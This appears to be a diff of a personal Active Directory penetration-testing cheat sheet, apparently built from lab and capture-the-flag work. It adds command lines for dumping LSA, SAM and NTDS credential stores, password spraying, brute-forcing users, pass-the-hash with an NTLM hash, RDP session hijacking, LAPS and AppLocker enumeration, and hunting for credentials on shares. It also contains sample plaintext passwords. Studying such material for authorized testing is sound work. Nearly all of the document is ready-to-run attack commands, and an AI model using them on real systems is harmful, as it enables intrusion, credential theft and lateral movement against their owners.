@@ -13,6 +13,12 @@ This document is a work-in-progress where I’m compiling a variety of technique
 <p style="font-size:2em; font-weight:bold; margin-bottom: 0;">ENUMERATION TECHNICS</p>
 <hr>
 
+## ENUMERATING ALL
+---
+```bash
+enum4linux -U 172.16.5.5
+enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" # grep users
+```
 ## ENUMERATING SMB
 ---
 **SMB (Server Message Block)** is a network file sharing protocol used in Windows environments that allows applications to read and write to files, request services from server programs, and communicate with other devices on a network. It's commonly used for sharing files and printers between computers within a local network.
@@ -25,8 +31,21 @@ crackmapexec smb 10.10.10.175 -u '' -p '' # Authenticate as anonymous
 crackmapexec smb 10.10.10.175 -u 'guest' -p 'guest' # Authenticate as guest
 crackmapexec smb 10.10.10.175 -u 'valid_creds' -p 'valid_creds' # Authenticate with valid credentials
 crackmapexec smb 10.10.10.177 -u <username> -p <password> --exec -c "<command>" # Execute commands
-crackmapexec smb 10.129.202.137 --local-auth -u whare -p password! --lsa # dumping lsa if we have permission
+crackmapexec smb 10.129.202.137 --local-auth -u f. -p Jenni_Luvs_Magic23 --lsa # dumping lsa if we have permission
 crackmapexec smb 10.129.202.137 --local-auth -u whare -p password! --sam #dumping sam if we have permission
+crackmapexec smb 10.129.202.137 -u avazquez -p Password123 --pass-pol # extract password policys
+````
+### Netexec for smb
+---
+````bash
+netexec smb 10.129.202.85 -u whare -p 's3cur3p@ssw0rd!' --ntds # Capturing ntds.ditt
+netexec smb 10.129.202.85 -u whare -p 's3cur3p@ssw0rd!' --lsa # dumping lsa
+netexec smb 10.129.202.85 -u whare -p 's3cur3p@ssw0rd!' --sam # dumping sam
+netexec smb 10.129.202.85 -u whare -p 's3cur3p@ssw0rd!' -X 'whoami -all' # execute powershell commands
+netexec smb 10.129.43.219 -u names.list -p pws.list --local-auth # for bureforce a local acc
+netexec smb 10.129.43.219 -u names.list -p pws.list --shares
+netexec smb 10.129.43.219 -u names.list -p pws.list --users # we can use groups/computers/pass-pol
+netexec smb 10.129.43.219 -u names.list -p pws.list --rid-brute # bruteforcing users
 ````
 ### Smbclient
 ---
@@ -43,8 +62,8 @@ smb: \> prompt OFF
 smb: \> recurse ON
 smb: \> mget *
 ````
-
 ### Smbmap
+---
 ````bash
 smbmap -H 10.10.10.192 -u audit2020 -p 'wharep@ssword2025'
 ````
@@ -96,16 +115,9 @@ netexec ldap <target-ip> -u <user> -p <password> --module user-desc # Search for
 netexec ldap <target-ip> -u <user> -p <password> --module adcs # Check for misconfigurations in ADCS
 netexec ldap <target-ip> -u <user> -p <password> --module ldap-checker # Search for bindings
 ````
-### Netexec for smb
----
-````bash
-netexec smb 10.129.202.85 -u whare -p 's3cur3p@ssw0rd!' --ntds # Capturing ntds.ditt
-netexec smb 10.129.202.85 -u whare -p 's3cur3p@ssw0rd!' --lsa # dumping lsa
-netexec smb 10.129.202.85 -u whare -p 's3cur3p@ssw0rd!' --sam # dumping sam
-netexec smb 10.129.202.85 -u whare -p 's3cur3p@ssw0rd!' -X 'whoami -all' # execute powershell commands
-netexec smb 10.129.43.219 -u names.list -p pws.list --local-auth # for bureforce a local acc
-````
 
+## ENUMERATING WINRM
+---
 ### Netexec for winrm
 ---
 ````bash
@@ -114,14 +126,7 @@ netexec winrm 10.129.202.85 -u names_list.txt -p password_list.txt
 
 ## ENUMERATING RDP
 ---
-### Metasploit for rdp
----
-````bash
-use auxiliary/scanner/rdp/rdp_scanner
-set RHOSTS <rango_de_ips>
-run
-````
-### Hijack RDP sesssion & disable restricted admin mode
+### Session hijack
 
 ````powershell
 sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
@@ -137,6 +142,7 @@ openssl s_client -showcerts -connect 10.10.11.202:3269 | openssl x509 -noout -te
 ````
 
 ## ENUMERATING MSSQL
+---
 MSSQL (Microsoft SQL Server):** MSSQL is a relational database management system (RDBMS) developed by Microsoft. It is widely used in enterprise environments to store and manage large amounts of data, supporting complex queries, transactions, and data integrity.
 
 ### Impacket-mssqclient
@@ -146,6 +152,40 @@ Impacket-mssqlclient is a tool from the Impacket suite, which provides scripts a
 ````bash
 impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
 ````
+
+## ENUMERATING SECURITY CONTROLS
+---
+### Windows defender
+---
+```powershell
+Get-MpComputerStatus
+```
+### AppLocker
+---
+AppLocker is a Microsoft tool for controlling which applications users can execute to protect against malware and unauthorized software. While it blocks common executables like `cmd.exe` or `PowerShell.exe`, bypassing restrictions is possible by leveraging overlooked file locations.
+
+```powershell
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
+### Powershell constrained lenguage mode
+---
+PowerShell Constrained Language Mode restricts features like COM objects and .NET types, limiting functionality, but its mode can be quickly enumerated.
+```powershell 
+$ExecutionContext.SessionState.LanguageMode
+```
+### Laps
+---
+The Microsoft Local Administrator Password Solution (LAPS) randomizes and rotates local administrator passwords to prevent lateral movement. It’s possible to enumerate domain users who can read LAPS passwords or identify machines without LAPS installed. Tools like LAPSToolkit parse ExtendedRights to reveal groups or accounts with access to LAPS passwords. Accounts that join computers to a domain often have rights to read these passwords, helping target specific AD users.
+
+```powershell
+Find-LAPSDelegatedGroups
+
+Find-AdmPwdExtendedRights # The `Find-AdmPwdExtendedRights` cmdlet identifies groups or users with "All Extended Rights," who can read LAPS passwords and may be less protected.
+
+Get-LAPSComputers # The `Get-LAPSComputers` function allows searching for computers with LAPS enabled, showing expired passwords and randomized passwords in cleartext if the user has access.
+```
+
 ## VULNERABILITIES
 ---
 ### Password sprying
@@ -157,8 +197,25 @@ crackmapexec smb 10.10.10.169 -u users.txt -p password.txt --continue-on-success
 netexec ldap <target-ip> -u users.txt -p password.txt --continue-on-succes
 netexec smb <target-ip> -u users.txt -p password.txt --continue-on-succes
 netexec winrm <target-ip> -u users.txt -p password.txt --continue-on-succes
+kerbrute passwordspray -d wharesito.local --dc 172.16.5.5 valid_users.txt  Welcome1
 ````
+#### Bash oneliner 
+---
+```bash
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+#### Local Admin Spraying with CrackMapExec
+---
+```bash
+netexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```
 
+#### Passsowrd sprying from windows
+---
+```powershell
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
 ### Kerberos pre-authentication vulnerability
 ---
 #### Username-anarchy
@@ -181,11 +238,12 @@ impacket-GetNPUsers.py -no-pass -usersfile test_users.txt EGOTISTICAL-BANK.local
 impacket-GetNPUsers.py -usersfile users.txt -domain DOMAIN.local -no-pass
 ````
 
-````bash
 `Kerbrute` is a tool for performing brute-force attacks against Kerberos authentication. It can be used to enumerate valid usernames and perform AS-REP Roasting attacks to obtain password hashes from users with Kerberos pre-authentication disabled.
+````bash
 # COMANDS
 kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL usernames.txt
 kerbrute userenum -d DOMAIN -i users.txt
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
 ````
 #### Kerberoasting
 ---
@@ -217,7 +275,6 @@ A Man-in-the-Middle (MITM) attack in the context of Active Directory (AD) involv
 
 #### MITM with mssql
 ---
-
 Once we re inside the MSSQL we can try to force a conexion with our smbserver to try catching its hash NTLMv2
 
 ````bash
@@ -249,11 +306,19 @@ With <a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramewo
 ---
 ### Enumerating privileges
 ---
-### Common commnds
+#### Common commnds
 ---
 ````powershell
 whoami -all
 whoami -groups
+Get-Module
+Import-Module ActiveDirectory
+Get-ADDomain
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+Get-ADTrust -Filter *
+Get-ADGroup -Filter * | select name
+Get-ADGroup -Identity "Backup Operators"
+Get-ADGroupMember -Identity "Backup Operators"
 ````
 #### Bloodhound for enumerating privileges
 ---
@@ -275,6 +340,27 @@ SharpHound is the data collection tool used by BloodHound. It scans the Active D
 We use <a href="https://github.com/SpecterOps/SharpHound/releases/tag/v1.1.0" target="_blank">SharpHound</a> because it performs a more thorough scan of the domain from within the network. It reveals detailed relationships and permissions that may not be accessible remotely, providing critical information for privilege escalation.
 
 **DISCLAIMER**: If you are using **BloodHound** installed from Kali's APT repository, you will need to run **SharpHound v1.1.0**. Otherwise, your data will not load properly.
+
+#### Powerview
+---
+PowerView is a PowerShell tool for AD enumeration, offering insights into users, groups, trusts, and file shares. Unlike BloodHound, it requires more manual effort but is highly effective for uncovering domain misconfigurations.
+
+```powershell
+# Domain User Info
+Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+# Recursive Group Membership
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+# Testing Local Admin Access
+Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+```
+#### Snaffler
+---
+Snaffler is a tool for finding credentials or sensitive data in Active Directory. It scans domain hosts for shares and readable directories, searching for files that can improve assessment access. It must run on a domain-joined host or with domain-user privileges.
+
+```powershell
+Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
+
+```
 
 ### Privileged AD Group Abuse
 ---
